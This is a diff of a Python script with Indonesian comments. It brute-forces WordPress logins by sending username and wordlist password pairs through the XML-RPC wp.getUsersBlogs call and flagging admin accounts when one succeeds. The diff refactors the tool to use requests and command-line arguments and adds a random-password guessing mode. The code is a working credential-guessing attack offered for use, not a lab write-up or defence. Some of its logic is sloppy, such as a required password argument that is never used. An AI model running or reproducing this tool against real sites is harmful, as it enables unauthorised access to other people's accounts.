@@ -1,26 +1,23 @@
 import os
+import random
+import string
 import time
 import logging
 from more_itertools import tabulate
 import requests
-from termcolor import colored
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import re
-import sys
 
-import urllib3  # Tambahkan import sys
+from termcolor import colored
+from concurrent.futures import ThreadPoolExecutor
+import re
+import argparse
 
 # Definisikan variabel global
 total = 0
 correct_pairs = {}
 
-
 # Inisialisasi logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
-
 
 # Definisikan warna
 YELLOW = 'yellow'
@@ -31,7 +28,6 @@ RED = 'red'
 def printout(text, color):
     print(colored(text, color))
 
-# Fungsi utama untuk mencoba kata sandi
 def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
     global correct_pairs
     if verbose is True or debug is True:
@@ -45,9 +41,10 @@ def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
                }
     post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
     try:
-        req = urllib3.request.Request(url, post.encode(), headers)
-        response = urllib.request.urlopen(req, timeout=3)
-        the_page = response.read()
+        req = requests.Request('POST', url, data=post, headers=headers)
+        session = requests.Session()
+        response = session.send(req, timeout=3)
+        the_page = response.text
         look_for = "isAdmin"
         try:
             splitter = the_page.split(look_for, 1)[1]
@@ -60,80 +57,90 @@ def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
             printout(success, GREEN)
             printout(adminAlert, RED)
             print("\n--------------------------")
+            return True, password
         except:
             pass
-    except urllib.error.URLError as e:
-        if e.code == 404 or e.code == 403:
-            global total
-            printout(str(e), YELLOW)
-            print(" - WAF or security plugin likely in use")
-            total = len(passlist)
-            return
-        else:
-            printout(str(e), YELLOW)
-            print(" - Try reducing Thread count ")
-            if verbose is True or debug is True:
-                print(user + ":" + password + " was skipped")
-    except socket.timeout as e:
+    except requests.exceptions.RequestException as e:
         printout(str(e), YELLOW)
-        print(" - Try reducing Thread count ")
+        print(" - WAF or security plugin likely in use")
+    except Exception as e:
+        printout(str(e), YELLOW)
+        print(" - An error occurred during the login attempt.")
         if verbose is True or debug is True:
             print(user + ":" + password + " was skipped")
-    except socket.error as e:
-        printout(str(e), YELLOW)
-        print(" - Got an RST, Probably tripped the firewall\n",)
-        total = len(passlist)
-        return
-
-def check_login(url, username, wordlist, proxies=None):
-    session = requests.Session()
-
-    # Konfigurasi proxy jika diberikan
-    if proxies:
-        session.proxies.update(proxies)
-
-    # Send a GET request to the login page to retrieve the form data
-    try:
-        login_page_response = session.get(url)
-        login_page_response.raise_for_status()  # Raise an exception for any HTTP error
-    except requests.exceptions.RequestException as e:
-        # Handle connection errors
-        logger.error(f"Connection error occurred during login check: {e}")
-        time.sleep(2)  # Menambahkan penundaan selama 2 detik sebelum mencoba kembali
-        return False, None
     
-def brute_force(url, username, wordlists):
+    return False, None  # Tambahkan pengembalian ini untuk menangani kasus kegagalan
+
+def is_strong_password(password):
+    if len(password) < 8:
+        return False
+    if not any(char.isdigit() for char in password):
+        return False
+    if not any(char.isupper() for char in password):
+        return False
+    if not any(char.islower() for char in password):
+        return False
+    if not any(char in string.punctuation for char in password):
+        return False
+    return True
+
+def generate_strong_password():
+    uppercase_letters = string.ascii_uppercase
+    lowercase_letters = string.ascii_lowercase
+    digits = string.digits
+    special_characters = string.punctuation
+    
+    all_characters = uppercase_letters + lowercase_letters + digits + special_characters
+    strong_password = ''.join(random.choice(all_characters) for _ in range(12))  # Menghasilkan password 12 karakter
+    
+    return strong_password
+
+def brute_force_single_wordlist(url, username, password_wordlist):
     results = []
-    total_combinations = sum(len(read_wordlist(file)) for file in wordlists)
-    combinations_tried = 0
     password_found = False
 
-    with ThreadPoolExecutor() as executor:
-        futures = []
-        for wordlist_file in wordlists:
-            wordlist = read_wordlist(wordlist_file)
-            futures.append(executor.submit(check_login, url, username, wordlist))
+    passwords = read_password(password_wordlist)
 
-        for future in as_completed(futures):
-            try:
-                success, password = future.result()
-            except Exception as e:
-                logger.error(f"Error occurred during login check: {e}")
-                continue
-            
-            combinations_tried += len(wordlist)
-            progress = combinations_tried / total_combinations * 100
-            logger.info(f"Loading: {progress:.2f}% Complete")
-
-            if success:
-                results.append((username, password, "Success"))
-                password_found = True
-                break
+    for password in passwords:
+        success, password = PasswordAttempt(username, password, url, 1, verbose=False, debug=False, agent="Mozilla/5.0")
+        if success:
+            results.append((username, password, "Success"))
+            password_found = True
+            break
 
     return results, password_found
 
-# Fungsi untuk membaca wordlist dari file
-def read_wordlist(wordlist_file):
+def brute_force_random_password(url, username):
+    results = []
+    password_found = False
+
+    strong_password = generate_strong_password()
+
+    success, password = PasswordAttempt(username, strong_password, url, 1, verbose=False, debug=False, agent="Mozilla/5.0")
+    if success:
+        results.append((username, password, "Success"))
+        password_found = True
+
+    return results, password_found
+
+def brute_force(url, username, password_wordlists):
+    results = []
+    password_found = False
+
+    if password_wordlists:
+        for wordlist_file in password_wordlists:
+            brute_force_results, password_found = brute_force_single_wordlist(url, username, wordlist_file)
+            results.extend(brute_force_results)
+            
+            if password_found:
+                break
+    else:
+        brute_force_results, password_found = brute_force_random_password(url, username)
+        results.extend(brute_force_results)
+
+    return results, password_found
+
+def read_password(wordlist_file):
     with open(wordlist_file, 'r') as file:
         wordlist = file.read().splitlines()
     return wordlist
@@ -148,42 +155,21 @@ def protocheck(url):
         return
 
 if __name__ == "__main__":
-    # ASCII Art Header with 7 different colors
-    banner = """
-    ██████   ██████ ███████████    █████ ██████   █████ ██████████      ███████    ██████   ██████ ███████████  
-    ░░██████ ██████ ░█░░░███░░░█   ░░███ ░░██████ ░░███ ░░███░░░░███   ███░░░░░███ ░░██████ ██████ ░░███░░░░░███ 
-     ░███░█████░███ ░   ░███  ░     ░███  ░███░███ ░███  ░███   ░░███ ███     ░░███ ░███░█████░███  ░███    ░███ 
-     ░███░░███ ░███     ░███        ░███  ░███░░███░███  ░███    ░███░███      ░███ ░███░░███ ░███  ░██████████  
-     ░███ ░░░  ░███     ░███        ░███  ░███ ░░██████  ░███    ░███░███      ░███ ░███ ░░░  ░███  ░███░░░░░███ 
-     ░███      ░███     ░███        ░███  ░███  ░░█████  ░███    ███ ░░███     ███  ░███      ░███  ░███    ░███ 
-     █████     █████    █████    ██ █████ █████  ░░█████ ██████████   ░░░███████░   █████     █████ █████   █████
-    ░░░░░     ░░░░░    ░░░░░    ░░ ░░░░░ ░░░░░    ░░░░░ ░░░░░░░░░░      ░░░░░░░    ░░░░░     ░░░░░ ░░░░░   ░░░░░ 
-    """
-    colored_banner = colored(banner, "yellow", attrs=["bold", "underline"])
-    print(colored_banner)
+    parser = argparse.ArgumentParser(description='Brute force WordPress login.')
+    parser.add_argument('-u', '--url', type=str, help='URL of the WordPress site', required=True)
+    parser.add_argument('-us', '--username', type=str, help='WordPress username', required=True)
+    parser.add_argument('-ps', '--password', type=str, help='WordPress password', required=True)
+    parser.add_argument('-W', '--wordlist', type=str, help='Path to the wordlist file', required=True)
+    args = parser.parse_args()
 
     # Masukkan URL dan username
-    url = input("Masukkan URL: ")
-    username = input("Masukkan username: ")
-
-    # Daftar file wordlist yang akan digunakan
-    wordlist_files = []
-    for i in range(1, 794):
-        wordlist_files.append(f"db/wordlist_1.txt")
+    url = args.url
+    username = args.username
+    wordlist_files = [args.wordlist] if args.wordlist else []
 
     # Buat log file
     log_filename = "brute_force_log.txt"
     log_file = open(log_filename, "a")
-
-    proxies = {
-        'http': 'http://proxy.example.com:8080',
-        'https': 'https://proxy.example.com:8080'
-    }
-
-    # Tulis informasi ke log file
-    log_file.write(f"URL: {url}\n")
-    log_file.write(f"Username: {username}\n\n")
-    log_file.write("Brute Force Log:\n")
 
     # Jalankan fungsi brute_force dengan URL, username, dan file wordlist yang diberikan
     start_time = time.time()
@@ -203,9 +189,12 @@ if __name__ == "__main__":
     print(table)
 
     # Tampilkan nama wordlist yang digunakan
-    print("\nWordlist used:")
-    for file in wordlist_files:
-        print(file)
+    if wordlist_files:
+        print("\nWordlist used:")
+        for file in wordlist_files:
+            print(file)
+    else:
+        print("\nNo wordlist used. Generated a random strong password.")
 
     # Tampilkan waktu yang dibutuhkan
     execution_time = end_time - start_time
